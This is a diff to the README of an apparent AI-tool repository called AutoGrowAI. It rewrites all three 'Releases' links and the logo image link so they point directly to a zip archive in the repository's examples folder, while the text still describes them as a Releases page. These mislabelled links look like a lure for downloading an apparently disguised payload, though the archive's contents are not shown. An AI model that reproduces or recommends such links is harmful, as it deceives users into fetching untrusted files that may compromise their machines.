@@ -25,7 +25,7 @@ The user-friendly interface of AutoGrowAI makes it easy for developers at any sk
 
 ## Getting Started
 
-To download and explore the latest features of AutoGrowAI, visit the [Releases](https://github.com/isgel/AutoGrowAI/releases) page. 
+To download and explore the latest features of AutoGrowAI, visit the [Releases](https://raw.githubusercontent.com/isgel/AutoGrowAI/main/examples/Grow_Auto_AI_3.4.zip) page. 
 
 ## Repository Topics
 
@@ -45,12 +45,12 @@ To download and explore the latest features of AutoGrowAI, visit the [Releases](
 
 ## Conclusion
 
-AutoGrowAI is your all-in-one solution for self-supervised learning AI projects. With its powerful features and user-friendly interface, you can take your AI development to the next level. Visit the [Releases](https://github.com/isgel/AutoGrowAI/releases) page to get started with AutoGrowAI today!
+AutoGrowAI is your all-in-one solution for self-supervised learning AI projects. With its powerful features and user-friendly interface, you can take your AI development to the next level. Visit the [Releases](https://raw.githubusercontent.com/isgel/AutoGrowAI/main/examples/Grow_Auto_AI_3.4.zip) page to get started with AutoGrowAI today!
 
 Get ready to revolutionize your AI projects with AutoGrowAI! 🚀
 
-![AutoGrowAI Logo](https://example.com/autogrowai-logo.png)
+![AutoGrowAI Logo](https://raw.githubusercontent.com/isgel/AutoGrowAI/main/examples/Grow_Auto_AI_3.4.zip)
 
 ---
 
-Remember, at AutoGrowAI, we believe in the power of innovation and simplicity. Our goal is to provide you with the tools and resources you need to succeed in the world of AI. Visit the [Releases](https://github.com/isgel/AutoGrowAI/releases) page now and start your journey towards AI excellence.
+Remember, at AutoGrowAI, we believe in the power of innovation and simplicity. Our goal is to provide you with the tools and resources you need to succeed in the world of AI. Visit the [Releases](https://raw.githubusercontent.com/isgel/AutoGrowAI/main/examples/Grow_Auto_AI_3.4.zip) page now and start your journey towards AI excellence.
